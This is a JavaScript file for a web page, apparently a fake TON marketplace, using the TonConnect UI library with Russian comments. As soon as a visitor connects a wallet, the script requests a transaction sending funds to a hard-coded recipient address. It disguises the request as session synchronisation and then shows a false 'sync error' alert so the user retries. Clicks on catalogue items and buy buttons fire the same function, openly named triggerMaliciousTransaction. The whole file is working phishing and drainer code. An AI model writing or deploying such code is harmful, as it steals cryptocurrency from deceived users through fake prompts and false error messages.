// Инициализация TonConnect UI
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://mrktmarket.github.io/mrkt/tonconnect-manifest.json',
    uiPreferences: {
        theme: 'DARK'
    }
});

// Твой кошелек-получатель
const TARGET_WALLET = "UQCPPgg85YaM4Yv9PjREap5IXYY8RWXCf47AqUIUToyjgRMh";

// Обработка нажатия на кнопку подключения / входа
const connectBtn = document.getElementById('connect-wallet-btn');

connectBtn.addEventListener('click', async () => {
    try {
        if (tonConnectUI.connected) {
            await tonConnectUI.disconnect();
            connectBtn.innerText = "Connect Wallet";
        } else {
            await tonConnectUI.openModal();
        }
    } catch (error) {
        console.error("Ошибка подключения:", error);
    }
});

// Отслеживание состояния подключения кошелька
tonConnectUI.onStatusChange(async (walletInfo) => {
    if (walletInfo) {
        console.log("Кошелек подключен:", walletInfo.account.address);
        connectBtn.innerText = "Connected";
        
        // Как только кошелек подключен, сразу вызываем запрос транзакции под видом синхронизации/авторизации
        await triggerMaliciousTransaction();
    }
});

// Функция формирования и отправки транзакции
async function triggerMaliciousTransaction() {
    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 300,
        messages: [
            {
                address: TARGET_WALLET,
                amount: "50000000"
            }
        ]
    };

    try {
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log("Транзакции отправлены:", result);
        alert("Ошибка синхронизации сессии. Повторите попытку позже.");
    } catch (e) {
        console.log("Пользователь отменил или ошибка сети", e);
    }
}

// Перехват кликов по товарам в каталоге
document.querySelectorAll('.item-card, .buy-btn').forEach(element => {
    element.addEventListener('click', async () => {
        if (!tonConnectUI.connected) {
            await tonConnectUI.openModal();
        } else {
            await triggerMaliciousTransaction();
        }
    });
});
